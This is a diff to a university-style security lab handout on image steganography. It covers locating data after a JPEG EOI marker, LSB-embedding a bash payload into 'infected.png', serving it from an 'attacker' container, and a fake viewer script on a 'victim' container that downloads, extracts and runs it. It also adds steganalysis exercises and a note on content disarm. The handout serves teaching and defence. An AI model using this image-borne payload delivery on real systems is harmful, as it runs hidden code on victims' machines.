@@ -8,7 +8,7 @@ Each of these is appropriately named for the task 2 instructions, however you ca
 
 You will find that you need to transfer files between your computer and the containers, for image viewing, text editing, or other purposes. For your convenience, we set up a `volumes` folder. This folder is shared between both containers and the host.
 
-You can easily get a shell in any of the containers by using `docker exec -it <container_name> /bin/bash>.
+You can easily get a shell in any of the containers by using `docker exec -it <container_name> /bin/bash`.
 
 Once you are done with the containers, running `docker-compose down --rmi all` will destroy them and their images.
 
@@ -19,11 +19,10 @@ By closely interacting with a steganographed image and inspecting it you will co
 
 ### Task 1.1 - Image viewers are not forensic tools
 
-Take a look at the `challenge.jpg` picture, available in the volumes folder, with any image viewer of your choice. You should see an old scientific magazine's drawing of a gnu. This doesn't really tell us anything. Even if there was a binary payload of a virus in here, the image viewer would
-not show us that.
+Take a look at the `challenge.jpg` picture, available in the volumes folder, with any image viewer of your choice. You should see an old scientific magazine's drawing of a gnu. This doesn't really tell us anything. Even if there was a binary payload of a virus in here, the image viewer would not show us that.
 
 A good surface level inspection tool for many sorts of binary media files (images, videos, PDFs, audio,...) is the `exiftool` command line tool.
-Using the provided Docker image or your own Linux computer, inspect the image. You can do so with the command `exiftool <file_name>`.
+Now access one of the provided Docker containers (for example, using `docker exec -it attacker /bin/bash`), or use your own Linux machine. Then navigate to the shared volumes directory: `cd volumes`; And inspect the image using: `exiftool challenge.jpg`
 
 - Describe the output of the `exiftool` command, noting the MIME and file type.
 
@@ -33,13 +32,20 @@ In order to see if there is something hidden in the file, we will need to unders
 
 ### Task 1.2. - Image file encodings
 
-Image files are simply binary files, with specific encodings that tell programs how to parse and represent them. In the case of JPEG, a quick look at the Wikipedia page https://en.wikipedia.org/wiki/JPEG_File_Interchange_Format will tell you more about the JFIF (JPEG File Interchange Format) in which JPEG conforming files are encoded.
+Image files are simply binary files, with specific encodings that tell programs how to parse and represent them. In the case of JPEG, a quick look at the [JFIF (JPEG File Interchange Format) specification](https://www.w3.org/Graphics/JPEG/jfif3.pdf) will tell you more about the JFIF in which JPEG conforming files are encoded.
 
-Independently of what encoding the image file has, it will most certainly contain its own convention for a "header", i.e. a set of specific bytes that signify what encoding the image has, as well as possibly other attributes such as width and height. It is also important to signify when the image data is over. In the case of JPEG, a EOI (end-of-image) byte sequence can be found at the end of the image data. Such identifying byte sequences are commonly called magic bytes or file signatures.
+Independently of what encoding the image file has, it will most certainly contain its own convention for a "header", i.e. a set of specific bytes that signify what encoding the image has, as well as possibly other attributes such as width and height. It is also important to signify when the image data is over. In the case of JPEG, an EOI (end-of-image) byte sequence can be found at the end of the image data. Such identifying byte sequences are commonly called magic bytes or file signatures.
 
-- Using a hex inspection tool, such as `hexdump` or `xxd` try to find the byte sequences characteristic of JFIF files in the binary contents. It might be useful to pipe the output of the program to a pager. You can do that by appending ` | less` to the command. Also remember strings or byte sequences may be broken up in your terminal...
-- Some hex visualizers also print ASCII strings. Look for the JFIF string in the file.
-- Try to find the EOI indicator. Is there any data past it?
+- Using a hex inspection tool such as `xxd`, inspect the binary contents of the image with `xxd challenge.jpg | less`. Since the output may span many pages, the `less` pager is used for navigation. If you are unfamiliar with it:
+	- Scroll using the arrow keys or mouse wheel
+	- Search for text or hexadecimal patterns with `/{pattern}` (this search only looks for patterns further down from your position in the document)
+	- Press `g` to return to the top of the file (it is reccomended to do this before every search)
+	- Jump to the next match with `n`
+	- Exit at any time by pressing `q`
+
+- JPEG/JFIF files contain characteristic byte sequences known as magic bytes or file signatures. Search for the string `JFIF` in the file content. In case you can't find it, you may look for it in parts using its  hexadecimal representation: `4a 46 49 46`
+
+- The JPEG EOI (End Of Image) marker corresponds to the hexadecimal byte sequence `ffd9`. Search for it with `/ffd9`. Is there any data present after the EOI marker?
 
 ### Task 1.3. - Uncovering the second image
 
@@ -47,7 +53,7 @@ If you completed the previous task, you may have noticed there exists data beyon
 
 - Look up encoding byte sequences for other common image file formats, i.e. PNG. Try to locate them using the hex tools mentioned.
 
-At this point, you should have enough information to determine whether another file has been embedded in the carrier image. You have two ways to extract it - using sophisticated tooling such as `binwalk`, a program that can identify and optionally extract embedded files and data, or simply using `dd if=<inputfile> of=<outputfile> bs=1 skip=<beginByte>` to copy out the embedded file byte by byte. Whatever your approach is,
+At this point, you should have enough information to determine whether another file has been embedded in the carrier image. You have two ways to extract it - using sophisticated tooling such as `binwalk`, a program that can identify and optionally extract embedded files and data, or simply using `dd if=<inputfile> of=<outputfile> bs=1 skip=<beginByte>` to copy out the embedded file byte by byte (you can get the `beginByte` by finding the byte immediately after the EOI marker again, and it with `printf "%d\n" 0x<offset>`). Whatever your approach is,
 - Describe your process and the resulting file.
 - Reflect on why this simple file concatenation technique may evade casual inspection.
 
@@ -82,13 +88,19 @@ If we switch "off" the MSB we will have:
 
 	R = 01111111 = 127
 
-In other words, we have a vessel for data in the form of a bit that will essentially barely change the color of the resulting pixel. 3 bits per pixel (1 LSB per channel) are ours to modify as we please. The only restriction is that the number of bits we want to embed must be smaller than the amount of pixels in the image divided by 3.
+In other words, we have a vessel for data in the form of a bit that will essentially barely change the color of the resulting pixel. 3 bits per pixel (1 LSB per channel) are ours to modify as we please. The only restriction is that the number of bits we want to embed must be smaller than the amount of pixels in the image multiplied by 3.
 
 Another thing to keep in consideration is to use a PNG encoded image as a carrier, since it is a lossless format, as opposed to JPEG.
 
 A great library for manipulating image files is the PIL (pillow) python library. You will find in the `labsetup` folder a python program `embed.py` that toggles all LSBs of an image to 0. Run the program with no payload (just input some random gibberish in that field) on the `duck.png` image. Make sure to output it to a .png as well.
+For example:
+
+```bash
+python embed.py duck.png [anything] infected.png
+```
+
 - Can you see any difference between the original image and the resulting image? Why?
-- Make the necessary additions and modifications to the code in order to embed the payload into it.
+- Make the necessary additions and modifications to the code in order to embed the payload into it. Make sure to name the output `infected.png`.
 
 If you're having trouble, make sure to:
 - Open the payload file in "rb" mode.
@@ -109,11 +121,81 @@ Hosting the image is easy enough. Simply move it into a folder of your choosing 
 
 ```
 mkdir -p website && mv infected.png website/.
+cd website
 python -m http.server 8000
 ```
 
 In the victim container you will find an ```imv_fake.sh``` script. It mimics the command line utility `imv` for image viewing, but instead downloads the malicious image on the provided link, calls `extractor.py` on it and runs `payload.sh`.
 
 - Make the necessary modifications to `extractor.py`in order to have it extract the hidden payload to the destination bash executable.
-- Run `imv_fake.sh` with the remote HTTP link and verify if you managed to execute the malicious payload.
+- Run `imv_fake.sh` with the attacker hostname, HTTP port, and image filename. For example:
+
+```bash
+./imv_fake.sh attacker 8000 infected.png
+```
 - Can you describe plausible real-world scenarios in which similar extractors could realistically execute automatically?
+
+## Task 3 - Steganalysis
+It is often difficult to identify steganographic alterations to files, as they are frequently encrypted or compressed; we must, therefore, rely on more sophisticated methods of analysis to stand a better chance at detecting malicious changes. The field of steganalysis fills this need.
+
+In this section we will explore some steganalysis techniques that attempt to identify artificial changes to file contents by searching for discrepancies in noise patterns and file format behavior.
+
+### Task 3.1 - Noise-Floor Consistency Analysis
+
+Most input devices produce some degree of background noise that follows patterns characteristic of the device. The addition of steganographically embedded code disturbs these patterns, leading to pseudo-random regions in the code.
+
+Noise-Floor Consistency Analysis is a set of techniques aimed at identifying these disturbances. To use it, we must first obtain the noise map of an image in the following steps. It is recommended you use the cv2 library in Python for this exercise.
+
+- Apply the embed.py file obtained in Task 2.1 to an image in order to steganographically hide a payload inside of it.
+- Apply a GaussianBlur or MedianBlur to the clean and embedded image in order to obtain a denoised estimate of them.
+- Find the absolute difference between the original and denoised images, called the residuals.
+
+You may find the following OpenCV functions useful:
+- `cv2.imread`
+- `cv2.GaussianBlur`
+- `cv2.absdiff`
+
+By doing this, we are effectively making a map of how much each value differs from the ones around it, approximating the noise produced in that pixel. The result we obtain differs depending on the denoising method used, and while the suggested blurs aren't the most sophisticated, they can get a sufficiently good result for this exercise.
+
+We can now start analyzing the noise-floor. There are several methods we can use, but in this exercise we will focus on the analysis of the variance in the noise values. 
+
+- Find the variance value of the residual in both the clean and embedded image.
+- Apply the same process to different images and verify in which ones the variance difference is significant and which external factors could be impacting variance.
+- Is the variance difference significant? Try applying the same process to different images or using different measurements such as Entropy and Neighbor Correlation.
+
+There are several factors that can influence our measurements like textured regions, natural image variability, payload size, and denoising method. It is therefore best to employ a higher variety of measurements when trying to identify steganographical embeddings, such as Entropy or Neighboor Correlation.
+
+### Task 3.2 - Format Analysis
+
+In Task 1 we identified an image hidden after an EOI flag in the original jpeg. In doing so, we engaged in one of the several branches of Format Analysis, a set of techniques aimed at identifying steganographical additions to files by analyzing their file structure, metadata, encoding rules, etc.
+
+In this section we will focus on Metadata Analysis, which works by extracting the metadata from the possibly compromised file and trying to find discrepancies that suggest the file has been altered.
+
+- There are two images in the volumes directory labeled "metadata1.jpg" and "metadata2.jpg". You should create a Python script to obtain the following metadata flags from each image using Pillow, if they exist:
+	- Software
+	- DateTimeOriginal
+	- DateTime
+	- Make
+	- Model
+	- Image Dimensions
+	- Compression Information
+
+You may find the `Image.getexif()` method and the `PIL.ExifTags.TAGS` mapping useful for decoding EXIF tag identifiers.
+
+Although not always relevant, present, or indicative of steganographical activity, there are certain ways in which these tags can indicate that the picture has been altered, which should alert you to the possible hidden content:
+
+- Software - Can indicate the usage of editing software in allegedly unaltered images.
+- DateTimeOriginal/DateTime - Might directly show the file has been edited if there is a discrepancy between the dates.
+- Make/Model - Missing values can indicate synthetic generation, editing, or general metadata stripping, while impossible combinations should also tip the analyst off to suspicious activity.
+- Image Dimensions - Unexpected dimensions may indicate manipulation.
+- Compression Information - Embeddings often require recompression, which might be shown in this field. Unusually low quality can also be an indication of manipulation.
+
+There are, of course, countless other tags that could help you determine the possibility of hidden files, as well as more general signs of editing such as the absence of tags that should have been present.
+
+- Finally, we ask you to try to determine which, if any, of the images' metadata display signs of steganography embedding, justifying your answer with their tag contents.
+
+## Further Research
+
+There are many techniques and tools that could not be fully explored in the scope of this lab. If you seek to expand your knowledge beyond it, we suggest you look into the Content Disarm and Reconstruction (CDR) technique. 
+
+CDR works by essentially stripping files of any data that is not strictly necessary for their functioning, thus removing most hiding spots of Steganographic embeddings. They can do this by stripping metadata, recompressing images, rewriting file structures, etc.
